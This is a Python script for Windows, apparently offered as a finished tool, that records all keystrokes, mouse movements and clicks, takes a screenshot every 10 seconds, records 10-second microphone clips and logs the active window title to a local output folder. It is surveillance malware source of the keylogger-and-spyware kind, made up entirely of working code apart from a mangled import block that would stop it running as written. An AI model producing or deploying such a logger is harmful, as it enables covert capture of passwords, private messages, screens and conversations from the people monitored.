import pyautogui
import pynput
from pynput.keyboard
import Key
Listener
from PIL import ImageGrab
import sounddevice as sd
import soundfile as sf
import os
import datetime
import win32api
import win32con
import win32gui
import time

# Set output folder path
output_folder = "output"

# Create output folder if it doesn't exist
if not os.path.exists(output_folder):
    os.makedirs(output_folder)

# Keyboard Logger
def on_press(key):
    try:
        # Log key press to file
        with open(os.path.join(output_folder, "keylog.txt"), "a") as f:
            f.write(f"{key} pressed at {datetime.datetime.now()}\n")
    except Exception as e:
        print(f"Error logging key press: {e}")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Create keyboard listener
keyboard_listener = Listener(on_press=on_press, on_release=on_release)
keyboard_listener.start()

# Mouse Logger
def on_move(x, y):
    try:
        # Log mouse movement to file
        with open(os.path.join(output_folder, "mouselog.txt"), "a") as f:
            f.write(f"Mouse moved to ({x}, {y}) at {datetime.datetime.now()}\n")
    except Exception as e:
        print(f"Error logging mouse movement: {e}")

def on_click(x, y, button, pressed):
    try:
        # Log mouse click to file
        with open(os.path.join(output_folder, "mouselog.txt"), "a") as f:
            f.write(f"Mouse {button} {'pressed' if pressed else 'released'} at ({x}, {y}) at {datetime.datetime.now()}\n")
    except Exception as e:
        print(f"Error logging mouse click: {e}")

# Create mouse listener
mouse_listener = pynput.mouse.Listener(on_move=on_move, on_click=on_click)
mouse_listener.start()

# ScreenShot Logger
def take_screenshot():
    try:
        # Take screenshot and save to file
        img = pyautogui.screenshot()
        img.save(os.path.join(output_folder, f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"))
    except Exception as e:
        print(f"Error taking screenshot: {e}")

# Take screenshot every 10 seconds
import schedule
schedule.every(10).seconds.do(take_screenshot)

# Microphone Logger
def record_audio():
    try:
        # Record audio for 10 seconds and save to file
        fs = 44100
        duration = 10
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sf.write(os.path.join(output_folder, f"audio_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"), recording, fs)
    except Exception as e:
        print(f"Error recording audio: {e}")

# Record audio every 10 seconds
schedule.every(10).seconds.do(record_audio)

# Window Logger
def get_window_title():
    try:
        # Get current window title
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        with open(os.path.join(output_folder, "windowlog.txt"), "a") as f:
            f.write(f"Window title: {title} at {datetime.datetime.now()}\n")
    except Exception as e:
        print(f"Error logging window title: {e}")

# Log window title every 10 seconds
schedule.every(10).seconds.do(get_window_title)

# Run scheduled tasks
while True:
    schedule.run_pending()
    time.sleep(1) 

code for windows 11 pro